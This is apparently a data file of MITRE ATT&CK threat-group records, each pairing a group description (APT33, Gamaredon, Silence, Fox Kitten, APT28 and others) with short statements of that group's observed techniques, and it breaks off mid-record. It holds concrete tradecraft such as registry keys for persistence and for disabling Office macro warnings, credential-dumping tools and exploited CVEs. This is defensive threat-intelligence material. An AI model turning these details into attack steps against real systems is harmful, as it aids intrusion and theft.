endpoints.", "APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).", "APT33 has used base64 to encode payloads.", "APT33 has created a scheduled task to execute a .vbe file multiple times a day.", "APT33 has used password spraying to gain access to target systems.", "APT33 has used valid accounts for initial access and privilege escalation.", "APT33 has sent spearphishing emails containing links to .hta files.", "APT33 has used FTP to exfiltrate files (separately from the C2 channel).", "APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts.", "APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials.", "APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails.", "APT33 has downloaded additional files and programs from its C2 server.\t\n", "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.", "APT33 has used base64 to encode command and control traffic.", "APT33 has used WinRAR to compress data prior to exfil.\t\n", "APT33 has used AES for encryption of command and control traffic.", "APT33 has sent spearphishing e-mails with archive attachments."], "is_subtechnique": false}
{"text": " [DarkVishnya](https://attack.mitre.org/groups/G0105) is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.(Citation: Securelist DarkVishnya Dec 2018)", "idx": "https://attack.mitre.org/groups/G0105", "title": "DarkVishnya", "entity": "DarkVishnya", "entity_type": "groups", "entity_context": ["DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec.", "DarkVishnya scanned the network for public shared folders.", "DarkVishnya used network sniffing to obtain login data. ", "DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.", "DarkVishnya created new services for shellcode loaders distribution.", "DarkVishnya used DameWare Mini Remote Control for lateral movement.", "DarkVishnya used PowerShell to create shellcode loaders.", "DarkVishnya performed port scanning to obtain the list of active services.", "DarkVishnya used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network.", "DarkVishnya used brute-force attack to obtain login data."], "is_subtechnique": false}
{"text": " [Gamaredon Group](https://attack.mitre.org/groups/G0047) is a threat group that has been active since at least 2013 and has targeted individuals likely involved in the Ukrainian government. The name [Gamaredon Group](https://attack.mitre.org/groups/G0047) comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)", "idx": "https://attack.mitre.org/groups/G0047", "title": "Gamaredon Group", "entity": "Gamaredon Group", "entity_type": "groups", "entity_context": ["Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.", "Tools used by Gamaredon Group are capable of downloading and executing additional payloads.", "Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded.", "Gamaredon Group has created a scheduled task to launch an executable every 10 minutes.\t", "A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.", "Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in <code>Microsoft.CSharp.CSharpCodeProvider</code> class.\t", "Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.", "Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file.", "Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence.", "Gamaredon Group has used DOCX files to download malicious DOT document templates. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.", "Gamaredon Group has collected files from infected systems and uploaded them to a C2 server.", "Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the <code>/altvba</code> option, once the Application.Startup event is received.", "Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings.\t", "Gamaredon Group has used modules that automatically upload gathered documents to the C2 server.", "A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.", "A Gamaredon Group file stealer can communicate over HTTP for C2.", "Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents.", "A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server.", "Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros.", "Gamaredon Group has removed security settings for VBA macro execution by changing registry values <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\VBAWarnings</code> and <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\AccessVBOM</code>.", "Gamaredon Group's malware can take screenshots of the compromised computer every minute.\t", "Gamaredon Group malware has used rundll32 to launch additional malicious components.", "Gamaredon Group malware can insert malicious macros into documents using a <code>Microsoft.Office.Interop</code> object.\t", "Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments, and used obfuscated or encrypted scripts.", "Gamaredon Group has delivered spearphishing emails with malicious attachments to targets.", "Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader.", "A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.", "Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.\t", "Gamaredon Group malware has collected Microsoft Office documents from mapped network drives.", "Gamaredon Group malware has used <code>CreateProcess</code> to launch additional malicious components.", "Gamaredon Group has obfuscated .NET executables by inserting junk code.\t", "Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives.", "Gamaredon Group tools can delete files used during an infection.", "Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.\t"], "is_subtechnique": false}
{"text": " [APT12](https://attack.mitre.org/groups/G0005) is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.(Citation: Meyers Numbered Panda)", "idx": "https://attack.mitre.org/groups/G0005", "title": "APT12", "entity": "APT12", "entity_type": "groups", "entity_context": ["APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).", "APT12 has used blogs and WordPress for C2 infrastructure.", "APT12 has sent emails with malicious Microsoft Office documents and PDFs attached.", "APT12 has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.", "APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing."], "is_subtechnique": false}
{"text": " [Elderwood](https://attack.mitre.org/groups/G0066) is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora. (Citation: Security Affairs Elderwood Sept 2012) The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers. (Citation: Symantec Elderwood Sept 2012) (Citation: CSM Elderwood Sept 2012)", "idx": "https://attack.mitre.org/groups/G0066", "title": "Elderwood", "entity": "Elderwood", "entity_type": "groups", "entity_context": ["Elderwood has packed malware payloads before delivery to victims.", "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.", "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.", "Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.", "Elderwood has encrypted documents and malicious executables.", "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links.", "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.", "The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.", "Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits."], "is_subtechnique": false}
{"text": " [Silence](https://attack.mitre.org/groups/G0091) is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)", "idx": "https://attack.mitre.org/groups/G0091", "title": "Silence", "entity": "Silence", "entity_type": "groups", "entity_context": ["Silence can create, delete, or modify a specified Registry key or value.", "Silence has used compromised credentials to log on to other systems and escalate privileges.", "Silence has been observed making videos of victims to observe bank employees day to day activities.", "Silence has used JS scripts.", "Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs.", "Silence has weaponized CHM files in their phishing campaigns.", "Silence has named its backdoor \"WINWORD.exe\".", "Silence has used PowerShell to download and execute payloads.", "Silence has used port 444 when sending data about the system from the client to the server.\t", "Silence has used scheduled tasks to stage its operation.", "Silence has used Windows command-line to run commands.", "Silence attempts to get users to launch malicious attachments delivered via spearphishing emails.", "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.", "Silence has used VBS scripts.", "Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.\t", "Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.\t", "Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. ", "Silence can capture victim screen activity.", "Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.", "Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.\t", "Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).", "Silence has used <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, and the Startup folder to establish persistence.\t", "Silence has used environment variable string substitution for obfuscation.", "Silence has used Winexe to install a service on the remote system.", "Silence has downloaded additional modules and malware to victim’s machines.\t", "Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe.", "Silence has obtained and modified versions of publicly-available tools like Empire and PsExec. ", "Silence has used RDP for lateral movement.\t"], "is_subtechnique": false}
{"text": " [Inception](https://attack.mitre.org/groups/G0100) is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.(Citation: Unit 42 Inception November 2018)(Citation: Symantec Inception Framework March 2018)(Citation: Kaspersky Cloud Atlas December 2014)", "idx": "https://attack.mitre.org/groups/G0100", "title": "Inception", "entity": "Inception", "entity_type": "groups", "entity_context": ["Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.", "Inception has used decoy documents to load malicious remote payloads via HTTP.", "Inception has encrypted network communications with AES.", "Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.", "Inception used a file listing plugin to collect information about file and directories both on local and remote drives.", "Inception used chains of compromised routers to proxy C2 communications between them and cloud service providers.", "Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.", "Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.", "Inception has used specific malware modules to gather domain membership.", "Inception lured victims into clicking malicious files for machine reconnaissance and to execute malware.", "Inception has used a reconnaissance module to identify active processes and other associated loaded modules.", "Inception has used PowerShell to execute malicious commands and payloads.", "Inception has ensured persistence at system boot by setting the value <code>regsvr32 %path%\\ctfmonrn.dll /s</code>.", "Inception has used VBScript to execute malicious commands and payloads.", "Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.", "Inception has obtained and used open-source tools such as LaZagne.", "Inception has used malicious HTA files to drop and execute malware.", "Inception has used HTTP, HTTPS, and WebDav in network communications.", "Inception has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.", "Inception has enumerated installed software on compromised systems.", "Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.", "Inception has maintained persistence by modifying Registry run key value \n <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code>."], "is_subtechnique": false}
{"text": " [Gorgon Group](https://attack.mitre.org/groups/G0078) is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. (Citation: Unit 42 Gorgon Group Aug 2018)", "idx": "https://attack.mitre.org/groups/G0078", "title": "Gorgon Group", "entity": "Gorgon Group", "entity_type": "groups", "entity_context": ["Gorgon Group malware can use process hollowing to inject one of its trojans into another process.", "Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system.", "Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.", "Gorgon Group sent emails to victims with malicious Microsoft Office documents attached.", "Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.", "Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines.", "Gorgon Group has used <code>-W Hidden</code> to conceal PowerShell windows by setting the WindowStyle parameter to hidden. ", "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under <code>HKCU\\Software\\Microsoft\\Office\\</code>.", "Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.", "Gorgon Group has obtained and used tools such as QuasarRAT and Remcos.", "Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the <code>taskkill</code> command.", "Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.", "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.", "Gorgon Group malware can download additional files from C2 servers.", "Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution."], "is_subtechnique": false}
{"text": " [Threat Group-3390](https://attack.mitre.org/groups/G0027) is a Chinese threat group that has extensively used strategic Web compromises to target victims. (Citation: Dell TG-3390) The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, and manufacturing sectors. (Citation: SecureWorks BRONZE UNION June 2017) (Citation: Securelist LuckyMouse June 2018)", "idx": "https://attack.mitre.org/groups/G0027", "title": "Threat Group-3390", "entity": "Threat Group-3390", "entity_type": "groups", "entity_context": ["A Threat Group-3390 tool can read and decrypt stored Registry values.", "Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.", "A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges.", "Threat Group-3390 has used <code>net user</code> to conduct internal discovery of systems.", "Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network.\t", "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.", "Threat Group-3390 actors use NBTscan to discover vulnerable systems.", "Threat Group-3390 has used the <code>net view</code> command.", "Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites.", "Threat Group-3390 has used <code>net use</code> to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.", "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.", "Threat Group-3390 has performed DLL search order hijacking to execute their payload.", "After re-establishing access to a victim network, Threat Group-3390 actors download tools including gsecdump and WCE that are staged temporarily on websites that were previously compromised but never used.", "Threat Group-3390 has extensively used strategic web compromises to target victims.", "Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.", "Threat Group-3390 malware has used HTTP for C2.", "Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts.", "Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.", "A Threat Group-3390 tool can create a new Registry key under <code>HKEY_CURRENT_USER\\Software\\Classes\\</code>.", "Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants in which the DLL acts as a stub loader that loads and executes the shell code.", "Threat Group-3390 has used PowerShell for execution.", "Threat Group-3390 has used command-line interfaces for execution.", "Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.", "Threat Group-3390 has used appcmd.exe to disable logging on a victim server.", "Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim.", "Threat Group-3390 actors have split RAR files for exfiltration into parts.", "A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process.", "During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.", "Threat Group-3390 has used a variety of Web shells.", "Threat Group-3390 has used CVE-2014-6324 to escalate privileges.", "Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration.", "Threat Group-3390 has used WinRM to enable remote execution.", "Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604.", "Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor. ", "A Threat Group-3390 tool can add the binary’s path to the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> to add persistence.", "A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.", "Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.", "A Threat Group-3390 tool can create a new service, naming it after the config information, to gain persistence.", "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services. Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.", "Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems.", "C2 traffic for most Threat Group-3390 tools occurs over Port Numbers 53, 80, and 443.", "Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration.", "A Threat Group-3390 tool can use WMI to execute a binary.", "Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network."], "is_subtechnique": false}
{"text": " [Winnti Group](https://attack.mitre.org/groups/G0044) is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting. (Citation: Kaspersky Winnti April 2013) (Citation: Kaspersky Winnti June 2015) (Citation: Novetta Winnti April 2015) Some reporting suggests a number of other groups, including [Axiom](https://attack.mitre.org/groups/G0001), [APT17](https://attack.mitre.org/groups/G0025), and [Ke3chang](https://attack.mitre.org/groups/G0004), are closely linked to [Winnti Group](https://attack.mitre.org/groups/G0044). (Citation: 401 TRG Winnti Umbrella May 2018)", "idx": "https://attack.mitre.org/groups/G0044", "title": "Winnti Group", "entity": "Winnti Group", "entity_type": "groups", "entity_context": ["Winnti Group used stolen certificates to sign its malware.", "Winnti Group looked for a specific process running on infected servers.", "Winnti Group used a rootkit to modify typical server functionality."], "is_subtechnique": false}
{"text": " [Fox Kitten](https://attack.mitre.org/groups/G0117) is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. [Fox Kitten](https://attack.mitre.org/groups/G0117) has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering.(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: Dragos PARISITE )(Citation: ClearSky Pay2Kitten December 2020)", "idx": "https://attack.mitre.org/groups/G0117", "title": "Fox Kitten", "entity": "Fox Kitten", "entity_type": "groups", "entity_context": ["Fox Kitten has obtained files from the victim's cloud storage instances.", "Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat.", "Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets.", "Fox Kitten has used valid credentials with various services during lateral movement.", "Fox Kitten has searched local system resources to access sensitive documents.", "Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.", "Fox Kitten has used valid accounts to access SMB shares.", "Fox Kitten has used PowerShell scripts to access credential data.", "Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as Ngrok and custom tool SSHMinion.", "Fox Kitten has exploited known vulnerabilities in remote services including RDP.", "Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports.", "Fox Kitten has created KeyBase accounts to communicate with ransomware victims.", "Fox Kitten has used cmd.exe likely as a password changing mechanism.", "Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate.", "Fox Kitten has used Volume Shadow Copy to access credential information from NTDS.", "Fox Kitten has brute forced RDP credentials.", "Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts.", "Fox Kitten has downloaded additional tools including PsExec directly to endpoints.", "Fox Kitten has used 7-Zip to archive data.", "Fox Kitten has base64 encoded scripts and payloads to avoid detection.", "Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate.", "Fox Kitten has used the PuTTY and Plink tools for lateral movement.", "Fox Kitten has used WizTree to obtain network files and directory listings.", "Fox Kitten has accessed files to gain valid credentials.", "Fox Kitten has used Amazon Web Services to host C2.", "Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.", "Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.", "Fox Kitten has used prodump to dump credentials from LSASS.", "Fox Kitten has searched network shares to access sensitive documents.", "Fox Kitten has used a Perl reverse shell to communicate with C2.", "Fox Kitten has installed web shells on compromised hosts to maintain access.", "Fox Kitten has used sticky keys to launch a command prompt.", "Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts.", "Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.", "Fox Kitten has created a local user account with administrator privileges.", "Fox Kitten has used scripts to access credential information from the KeePass database.", "Fox Kitten has used a Twitter account to communicate with ransomware victims.", "Fox Kitten has used RDP to log in and move laterally in the target environment.", "Fox Kitten has used Angry IP Scanner to detect remote systems.", "Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information."], "is_subtechnique": false}
{"text": " [ZIRCONIUM](https://attack.mitre.org/groups/G0128) is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community.(Citation: Microsoft Targeting Elections September 2020)(Citation: Check Point APT31 February 2021)", "idx": "https://attack.mitre.org/groups/G0128", "title": "ZIRCONIUM", "entity": "ZIRCONIUM", "entity_type": "groups", "entity_context": ["ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails.", "ZIRCONIUM has used malicious links and web beacons in e-mails for malware download and to track hits to attacker-controlled URL's.", "ZIRCONIUM has exfiltrated stolen data to Dropbox.", "ZIRCONIUM has used Python-based implants to interact with compromised hosts.", "ZIRCONIUM has used multi-stage packers for exploit code.", "ZIRCONIUM has exfiltrated files via the Dropbox API C2.", "ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.", "ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2.", "ZIRCONIUM has created a Registry Run key named <code>Dropbox Update Setup</code> to establish persistence for a malicious Python binary.", "ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware.", "ZIRCONIUM has used AES encrypted communications in C2.", "ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.", "ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.", "ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.", "ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails.", "ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.", "ZIRCONIUM has used tools to download malicious files to compromised hosts.", "ZIRCONIUM has purchased domains for use in targeted campaigns.", "ZIRCONIUM has created a run key named <code>Dropbox Update Setup</code> to mask a persistence mechanism for a malicious binary.", "ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.", "ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.", "ZIRCONIUM has used a tool to query the Registry for proxy settings.", "ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.", "ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation.", "ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host."], "is_subtechnique": false}
{"text": " APT28 is a skilled team of developers and operators collecting intelligence on defense and geopolitical issues—intelligence that would be useful only to a government. This APT group compiles malware samples with Russian language settings during working hours (8 a.m. to 6 p.m.), consistent with the time zone of Russia’s major cities, including Moscow and St. Petersburg. This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization, most likely the Russian government.", "idx": "https://attack.mitre.org/groups/G0007", "title": "APT28", "entity": "APT28", "entity_type": "groups", "entity_context": ["Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.", "APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key <code>HKCU\\Software\\Microsoft\\Office test\\Special\\Perf</code> to execute code.", "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.", "APT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.", "APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.", "An APT28 loader Trojan adds the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code> to establish persistence.", "APT28 has routed traffic over Tor and VPN servers to obfuscate their activities.", "APT28 has deployed malware that has copied itself to the startup directory for persistence.", "APT28 has collected information from Microsoft SharePoint services within target networks.", "APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.", "APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.", "APT28 has used Google Drive for C2.", "An APT28 backdoor may collect the entire contents of an inserted USB device.", "APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".", "APT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server.", "APT28 executed CHOPSTICK by using rundll32 commands such as <code>rundll32.exe “C:\\Windows\\twain_64.dll”</code>. APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.", "APT28 has renamed the WinRAR utility to avoid detection.", "APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server.", "APT28 has stored captured credential information in a file named pi.log.", "APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications.", "APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.", "APT28 has collected files from network shared drives.", "APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources and other organizations. ", "APT28 has used CVE-2015-4902 to bypass security features.", "APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection.", "APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.", "APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.", "APT28 has collected emails from victim Microsoft Exchange servers.", "APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.", "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function.", "APT28 can exfiltrate data over Google Drive. ", "APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.", "APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.", "APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.", "APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.", "APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.", "APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.", "APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.", "APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.", "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.", "APT28 has saved files with hidden file attributes.", "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.", "APT28 has used tools to perform keylogging.", "APT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.", "APT28 has used tools to take screenshots from victims.", "APT28 downloads and executes PowerShell scripts and performs PowerShell commands.", "APT28 has used COM hijacking for persistence by replacing the legitimate <code>MMDeviceEnumerator</code> object with a payload.", "APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.", "In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.", "APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.", "Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.", "APT28 has harvested user's login credentials.", "APT28 can perform brute force attacks to obtain credentials.", "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.\t", "APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL 